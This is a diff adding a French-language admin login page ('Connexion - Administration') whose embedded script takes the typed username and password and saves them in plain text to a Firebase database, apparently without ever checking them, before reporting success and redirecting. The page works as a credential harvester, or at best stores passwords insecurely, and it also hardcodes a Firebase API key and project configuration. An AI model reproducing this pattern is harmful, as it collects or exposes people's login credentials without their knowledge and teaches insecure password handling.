@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Administration</title>
+    <link rel="stylesheet" href="hii.css">
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAof6bT060pZ1q1Lj57UuFKCxqMnUhc1XA",
+            authDomain: "devest2024-2f38c.firebaseapp.com",
+            projectId: "devest2024-2f38c",
+            storageBucket: "devest2024-2f38c.appspot.com",
+            messagingSenderId: "107275103557",
+            appId: "1:107275103557:web:41b64c073b58ac2e84222c"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('login-form');
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault(); // Prevent form from reloading the page
+
+                // Fetch input values
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                // Reference to Firebase Database
+                const dataRef = ref(db, 'logins/' + Date.now());
+
+                try {
+                    // Save data to Firebase
+                    await set(dataRef, {
+                        username,
+                        password,
+                        timestamp: new Date().toISOString()
+                    });
+
+                    alert('Connexion réussie et données enregistrées avec succès !');
+                    form.reset(); // Clear the form
+                    window.location.href = 'Admin.html'; // Redirect to admin page
+                } catch (error) {
+                    console.error('Erreur lors de l\'enregistrement des données :', error);
+                    alert('Une erreur est survenue. Veuillez réessayer.');
+                }
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Connexion</h1>
+        <form id="login-form">
+            <div class="form-group">
+                <label for="username">Nom d'utilisateur</label>
+                <input type="text" id="username" name="username" placeholder="Entrez votre nom d'utilisateur" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn-submit">Se connecter</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
